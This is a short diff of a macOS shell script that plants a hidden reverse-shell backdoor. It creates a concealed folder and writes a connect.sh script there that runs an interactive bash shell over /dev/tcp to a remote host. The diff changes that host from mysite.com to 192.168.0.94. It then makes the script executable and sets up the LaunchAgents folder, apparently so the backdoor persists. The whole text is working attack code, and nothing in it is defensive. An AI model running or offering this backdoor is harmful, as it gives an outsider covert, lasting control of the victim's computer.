@@ -1,6 +1,6 @@
 mkdir ~/Library/.hidden
 echo '#!/bin/bash
-bash -i >& /dev/tcp/mysite.com/1337 0>&1
+bash -i >& /dev/tcp/192.168.0.94/1338 0>&1
 wait' > ~/Library/.hidden/connect.sh
 chmod +x ~/Library/.hidden/connect.sh
 mkdir ~/Library/LaunchAgents
